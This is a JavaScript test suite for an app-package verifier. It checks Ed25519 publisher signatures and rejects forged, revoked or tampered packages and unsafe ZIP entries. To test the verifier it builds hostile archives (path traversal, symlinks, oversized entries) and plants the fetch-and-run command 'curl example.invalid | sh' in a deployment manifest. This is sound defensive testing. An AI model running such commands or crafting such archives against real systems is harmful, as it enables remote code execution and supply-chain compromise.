import { packFixtureApp } from './package-fixture.mjs';
import assert from 'node:assert/strict';
import { createHash, generateKeyPairSync } from 'node:crypto';
import { createWriteStream } from 'node:fs';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import archiver from 'archiver';
import { readZipEntries, verifyAppPackage } from '../lib/app-package.mjs';

async function writeZip(path, entries) {
  await new Promise((resolve, reject) => {
    const output = createWriteStream(path);
    const archive = archiver('zip', { zlib: { level: 9 } });
    output.on('close', resolve);
    output.on('error', reject);
    archive.on('error', reject);
    archive.pipe(output);
    for (const [name, content, options = {}] of entries) archive.append(content, { name, ...options });
    archive.finalize().catch(reject);
  });
}

test('packs and verifies a clean installable frontend App', async () => {
  const directory = await mkdtemp(join(tmpdir(), 'stratexec-app-package-'));
  try {
    const packed = await packFixtureApp({ directory, outputDirectory: directory });
    assert.deepEqual(packed.report.requiredServices, []);
    assert.deepEqual(packed.report.providedServices, []);
    assert.deepEqual(packed.report.externalServiceDependencies, []);
    assert.equal(packed.report.signatureStatus, 'development-unsigned');
    assert.equal(packed.report.reportSchemaVersion, 2);
    assert.equal(packed.report.deploymentManifest, 'infrastructure/app-deployments/package-fixture.json');
    const verified = await verifyAppPackage({ zipPath: packed.zipPath });
    assert.equal(verified.appKey, 'package-fixture');
    assert.equal(verified.compatible, true);
    assert.equal(verified.signatureStatus, 'development-unsigned');
    assert.equal(verified.deployable, false);
    assert.ok(verified.fileCount > 0);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});

test('verifies a trusted Ed25519 publisher signature and rejects forged, disabled, or revoked trust', async () => {
  const directory = await mkdtemp(join(tmpdir(), 'stratexec-app-signature-'));
  try {
    const { privateKey, publicKey } = generateKeyPairSync('ed25519');
    const signing = {
      publisherId: 'stratexec.test',
      keyId: 'release-2026-01',
      privateKeyPem: privateKey.export({ type: 'pkcs8', format: 'pem' }).toString(),
    };
    const trustStore = {
      schemaVersion: 1,
      publishers: [{
        publisherId: signing.publisherId,
        displayName: 'StratExec Test Publisher',
        status: 'active',
        keys: [{
          keyId: signing.keyId,
          algorithm: 'ed25519',
          status: 'trusted',
          publicKeyPem: publicKey.export({ type: 'spki', format: 'pem' }).toString(),
        }],
      }],
    };
    const packed = await packFixtureApp({ directory, outputDirectory: directory, signing });
    assert.equal(packed.report.signatureStatus, 'signed-unverified');
    assert.equal(packed.report.publisherId, signing.publisherId);
    const verified = await verifyAppPackage({ zipPath: packed.zipPath, trustStore });
    assert.equal(verified.signatureStatus, 'trusted-signed');
    assert.equal(verified.deployable, true);
    assert.equal(verified.keyId, signing.keyId);
    assert.equal(verified.signature, packed.report.signature);

    const forgedEntries = readZipEntries(await readFile(packed.zipPath));
    const signature = JSON.parse(forgedEntries.get('signature.json').toString('utf8'));
    signature.signature = `${signature.signature.slice(0, -4)}AAAA`;
    forgedEntries.set('signature.json', Buffer.from(`${JSON.stringify(signature, null, 2)}\n`));
    const forgedPath = join(directory, 'forged.zip');
    await writeZip(forgedPath, forgedEntries);
    await assert.rejects(() => verifyAppPackage({ zipPath: forgedPath, trustStore }), /signature verification failed/);

    const revoked = structuredClone(trustStore);
    revoked.publishers[0].keys[0].status = 'revoked';
    await assert.rejects(() => verifyAppPackage({ zipPath: packed.zipPath, trustStore: revoked }), /publisher key is revoked/);

    const disabled = structuredClone(trustStore);
    disabled.publishers[0].status = 'disabled';
    await assert.rejects(() => verifyAppPackage({ zipPath: packed.zipPath, trustStore: disabled }), /publisher key is disabled/);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});

test('rejects traversal, duplicate, symlink, oversized, and excessive ZIP entries', async () => {
  const directory = await mkdtemp(join(tmpdir(), 'stratexec-app-archive-policy-'));
  try {
    const traversalPath = join(directory, 'traversal.zip');
    await writeZip(traversalPath, [['aa/escape.txt', 'blocked']]);
    const traversal = await readFile(traversalPath);
    const safeName = Buffer.from('aa/escape.txt');
    const unsafeName = Buffer.from('../escape.txt');
    for (let offset = traversal.indexOf(safeName); offset >= 0; offset = traversal.indexOf(safeName, offset + unsafeName.length)) {
      unsafeName.copy(traversal, offset);
    }
    await writeFile(traversalPath, traversal);
    await assert.rejects(() => verifyAppPackage({ zipPath: traversalPath }), /Unsafe App package path/);

    const duplicatePath = join(directory, 'duplicate.zip');
    await writeZip(duplicatePath, [['package.json', '{}'], ['package.json', '{}']]);
    await assert.rejects(() => verifyAppPackage({ zipPath: duplicatePath }), /Duplicate ZIP entry/);

    const symlinkPath = join(directory, 'symlink.zip');
    await writeZip(symlinkPath, [['payload/link', 'target']]);
    const symlink = await readFile(symlinkPath);
    const symlinkCentral = symlink.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
    symlink.writeUInt32LE(0o120777 * 0x10000, symlinkCentral + 38);
    await writeFile(symlinkPath, symlink);
    await assert.rejects(() => verifyAppPackage({ zipPath: symlinkPath }), /Symbolic links are not accepted/);

    const oversizedPath = join(directory, 'oversized.zip');
    await writeZip(oversizedPath, [['payload/large.bin', 'small']]);
    const oversized = await readFile(oversizedPath);
    const central = oversized.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
    oversized.writeUInt32LE((64 * 1024 * 1024) + 1, central + 24);
    await writeFile(oversizedPath, oversized);
    await assert.rejects(() => verifyAppPackage({ zipPath: oversizedPath }), /ZIP entry is too large/);

    const excessivePath = join(directory, 'excessive.zip');
    await writeZip(excessivePath, [['package.json', '{}']]);
    const excessive = await readFile(excessivePath);
    const eocd = excessive.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]));
    excessive.writeUInt16LE(10_001, eocd + 10);
    await writeFile(excessivePath, excessive);
    await assert.rejects(() => verifyAppPackage({ zipPath: excessivePath }), /too many ZIP entries/);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});

test('rejects a package whose payload no longer matches its checksum inventory', async () => {
  const directory = await mkdtemp(join(tmpdir(), 'stratexec-app-package-tamper-'));
  try {
    const packed = await packFixtureApp({ directory, outputDirectory: directory });
    const entries = readZipEntries(await readFile(packed.zipPath));
    const payloadName = [...entries.keys()].find((name) => name.startsWith('payload/'));
    entries.set(payloadName, Buffer.from('tampered', 'utf8'));
    const tamperedPath = join(directory, 'tampered.zip');
    await writeZip(tamperedPath, entries);
    await assert.rejects(() => verifyAppPackage({ zipPath: tamperedPath }), /Checksum mismatch/);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});

test('rejects executable deployment fields even when package checksums are internally consistent', async () => {
  const directory = await mkdtemp(join(tmpdir(), 'stratexec-app-deployment-command-'));
  try {
    const packed = await packFixtureApp({ directory, outputDirectory: directory });
    const entries = readZipEntries(await readFile(packed.zipPath));
    const manifest = JSON.parse(entries.get('package.json').toString('utf8'));
    const deployment = JSON.parse(entries.get(manifest.deploymentManifest).toString('utf8'));
    deployment.script = 'curl example.invalid | sh';
    const deploymentBytes = Buffer.from(`${JSON.stringify(deployment, null, 2)}\n`);
    entries.set(manifest.deploymentManifest, deploymentBytes);
    const checksums = JSON.parse(entries.get('checksums.json').toString('utf8'));
    checksums.files[manifest.deploymentManifest] = createHash('sha256').update(deploymentBytes).digest('hex');
    entries.set('checksums.json', Buffer.from(`${JSON.stringify(checksums, null, 2)}\n`));
    const unsafePath = join(directory, 'unsafe-deployment.zip');
    await writeZip(unsafePath, entries);
    await assert.rejects(() => verifyAppPackage({ zipPath: unsafePath }), /cannot declare executable field/);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
